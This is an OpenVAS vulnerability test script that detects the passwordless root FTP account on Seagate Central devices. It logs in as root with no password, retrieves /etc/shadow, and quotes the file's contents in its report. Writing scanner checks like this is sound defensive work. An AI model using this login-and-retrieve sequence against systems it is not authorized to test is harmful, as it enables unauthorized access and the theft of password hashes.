###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_seagate_central_passwordless_root_05_06.nasl 9552 2018-04-20 12:17:18Z cfischer $
#
# Seagate Central Remote Root Security Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105288");
 script_version("$Revision: 9552 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Seagate Central Remote Root Security Bypass Vulnerability");

 script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132163");

 script_tag(name: "vuldetect" , value:"Login into the remote FTP as root without password");
 script_tag(name: "solution" , value:"Ask the Vendor for an update.");
 script_tag(name: "summary" , value:"Seagate Central by default has a passwordless root account (and no option to change it).");
 script_tag(name:"solution_type", value: "NoneAvailable");

 script_tag(name:"qod_type", value:"exploit");

 script_tag(name:"last_modification", value:"$Date: 2018-04-20 14:17:18 +0200 (Fri, 20 Apr 2018) $");
 script_tag(name:"creation_date", value:"2015-06-05 14:40:09 +0200 (Fri, 05 Jun 2015)");
 script_category(ACT_GATHER_INFO);
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
 script_dependencies("ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_mandatory_keys("ftp_banner/available");

 exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
banner = get_ftp_banner( port:port );
if( "Welcome to Seagate Central" >!< banner ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

if( ! ftp_authenticate( socket:soc, user:'root', pass:'' ) )
{
  close( soc );
  exit(0);
}

port2 = ftp_pasv( socket:soc );
if( ! port2 )
{
  close( soc );
  exit(0);
}

soc2 = open_sock_tcp( port2 );
if( ! soc2 )
{
  close( soc );
  exit( 0 );
}

send( socket:soc, data:'RETR /etc/shadow\r\n' );

recv1 = recv( socket:soc, length:512  );
recv2 = recv( socket:soc2, length:512 );

close( soc );
close( soc2 );

if( "226 Transfer complete" >< recv1 && "sshd:" >< recv2 )
{
  report = 'It was possible to login as root without a password and to retrieve /etc/shadow. Here is the content:\n\n==========>>\n\n' + recv2 + '\n\n<<==========\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit ( 99 );
